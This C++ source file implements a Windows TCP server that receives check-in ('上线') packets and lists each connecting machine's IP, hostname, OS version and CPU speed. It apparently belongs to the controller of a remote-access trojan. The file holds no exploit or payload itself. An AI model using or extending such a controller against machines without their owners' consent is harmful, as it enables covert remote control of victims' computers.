#include "StdAfx.h"
#include "MainBusiness.h"

CMainBusiness* CMainBusiness::m_pInstance = NULL;
CMainBusiness::CMainBusiness(void)
{
	m_nPort=8000;			
	m_bExit=false;
	m_nThreadTotal=0;
	m_nExitThreadTotal=0;	
	HANDLE hThread=CreateThread(NULL,0,CloseUserThread,this,0,0);
	CloseHandle(hThread);	
}


CMainBusiness::~CMainBusiness(void)
{
}

void   CMainBusiness::Init(HWND hwnd)
{
	m_hWnd=hwnd;
	SetPort(m_nPort);
}

void   CMainBusiness::SetPort(unsigned short nPort)
{
	m_nPort=nPort;
	m_Server.Start(m_nPort);
	::SendMessage(m_hWnd,WM_UPDATEPORT,0,m_nPort);
}

void  CMainBusiness::DisposeBusiness(ITcpServer* pSender, CONNID dwConnID, const BYTE* pRecvData)
{
	int nCmd=pRecvData[0];
	switch ( nCmd )
	{
	case TOKEN_LOGIN: // 上线包
		{						
			Login(dwConnID,pSender,pRecvData);	
		}
		break;
	}
}

void  CMainBusiness::Login(CONNID dwConnID,ITcpServer* pSender,const BYTE* pData)
{
	TCHAR szAddress[50];
	int iAddressLen = sizeof(szAddress) / sizeof(TCHAR);
	USHORT usPort;
	pSender->GetRemoteAddress(dwConnID, szAddress, iAddressLen, usPort);
	LOGININFO*	pLoginInfo = (LOGININFO*)pData;		
#ifdef _UNICODE
	unsigned long dwCount =
		WideCharToMultiByte(0, 0, szAddress, -1, 0, 0, "X", 0);
	char* pChar = new char[dwCount];
	WideCharToMultiByte(0, 0, szAddress, -1, pChar, dwCount, "X", 0);
	CUser user((unsigned long)
		dwConnID, pChar,inet_ntoa(pLoginInfo->IPAddress),pLoginInfo->HostName,
		GetUserSYS(pLoginInfo),"","","","",pLoginInfo->CPUClockMhz);
	delete[] pChar;
#else
	CUser user((unsigned long)
		dwConnID, szAddress, inet_ntoa(pLoginInfo->IPAddress), pLoginInfo->HostName,
		GetUserSYS(pLoginInfo), "", "", "", "", pLoginInfo->CPUClockMhz);
#endif
	m_Report.GroupAddUser(pLoginInfo->UpGroup,user);
	m_Report.SetUserUpdate(user);
	::SendMessage(m_hWnd,WM_UPDATEREPORT,STATU_ADD,0);
}

DWORD WINAPI CMainBusiness::CloseUserThread(LPVOID lpParam)
{	
	CMainBusiness* pMainBusiness=(CMainBusiness*)lpParam;	
	pMainBusiness->AddThread();
	while( !pMainBusiness->GetExit() )
	{		
		list<int>listCloseUser;
		pMainBusiness->m_Report.GetCloseUser(listCloseUser);
		list<int>::iterator itor=listCloseUser.begin();
		for( ; itor != listCloseUser.end() ; itor++ )
		{
			CUser user=pMainBusiness->m_Report.GroupDelUser(*itor);
			pMainBusiness->m_Report.SetUserUpdate(user);
			::SendMessage(pMainBusiness->m_hWnd,WM_UPDATEREPORT,STATU_DEL,0);
			pMainBusiness->m_Report.DelCloseUser(*itor);			
		}		
		Sleep(1);
	}
	pMainBusiness->AddExitThread();
	return 0;
}


void  CMainBusiness::Close(CONNID dwConnID)
{
	m_Report.AddCloseUser(dwConnID);	
}


string   CMainBusiness::GetUserSYS(void*	pLoginInfo)
{	
	LOGININFO*	LoginInfo=(LOGININFO*)pLoginInfo;
	char *pszOS = NULL;
	if (LoginInfo->dwMajorVer <= 4 )
	{
		pszOS = "NT";
	}
	if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 0 )
	{
		pszOS = "2000";
	}
	if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 1 )
	{
		pszOS = "XP";
	}
	if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 2 )
	{
		if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = "2003";
		}
		else
		{
			pszOS = "2003R2";
		}
	}
	if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 0 )
	{
		if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = "Vista";
		}
		else
		{
			pszOS = "2008";
		}
	}
	if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 1 )
	{
		if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = "7";
		}
		else
		{
			pszOS = "2008 R2";
		}
	}
	if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 2 )
	{
		if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = "8";
		}
		else
		{
			pszOS = "2012";
		}
	}
	if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 3 )
	{
		if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = "8.1";
		}
		else
		{
			pszOS = "2012 R2";
		}
	}

	if ( LoginInfo->dwMajorVer == 10 && LoginInfo->dwMinorVer == 0 )
	{
		if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = "10";
		}
		else
		{
			pszOS = "2016";
		}
	}

	char cOS[128]={0};
	sprintf(cOS,"Win %s SP%d Build %d",	pszOS, LoginInfo->OsVerInfoEx.wServicePackMajor,LoginInfo->dwBuildNumber);
	string strOS(cOS);
	if(LoginInfo->bIsWow64)	
		strOS += " x64";
	else
		strOS += " x86";
	return strOS;
}

void  CMainBusiness::AddThread()
{
	m_nThreadTotal+=1;
}

void   CMainBusiness::AddExitThread()
{
	m_nExitThreadTotal+=1;
}

bool  CMainBusiness::GetExit()
{
	return m_bExit;
}
void  CMainBusiness::SetExit()
{
	m_bExit=true;
}

bool  CMainBusiness::WaitAllThreadExit()
{
	int nCount=0;
	while( m_bExit )
	{
		Sleep(10);
		if( m_nThreadTotal == m_nExitThreadTotal )
		{
			return true;
		}
		if( nCount++ >= 10 )//10秒后强制退出
		{
			break;
		}
	}
	return true;
}

CReport CMainBusiness::GetReport()
{
	return m_Report;
}